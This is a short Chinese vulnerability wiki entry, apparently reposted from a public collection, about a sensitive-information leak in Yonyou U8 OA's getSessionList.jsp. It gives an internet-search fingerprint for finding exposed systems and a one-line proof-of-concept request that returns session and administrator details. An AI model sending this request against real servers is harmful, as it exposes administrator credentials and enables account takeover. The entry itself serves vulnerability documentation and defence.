---
title: "用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞"
date: 2026-10-17 09:13:02
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "用友"
tags:
  - "用友"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

用友 U8 OA getSessionList.jsp文件，通过漏洞攻击者可以获取数据库中管理员的账户信息

## 漏洞影响

```
用友 U8 OA
```

## 网络测绘

```
"用友U8-OA"
```

## 漏洞复现

登录页面

![image-20220520141805589](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201418731.png)

验证POC

```
/yyoa/ext/https/getSessionList.jsp?cmd=getAll
```

![image-20220520141832426](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201418464.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E7%94%A8%E5%8F%8B-U8-OA-getSessionList.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
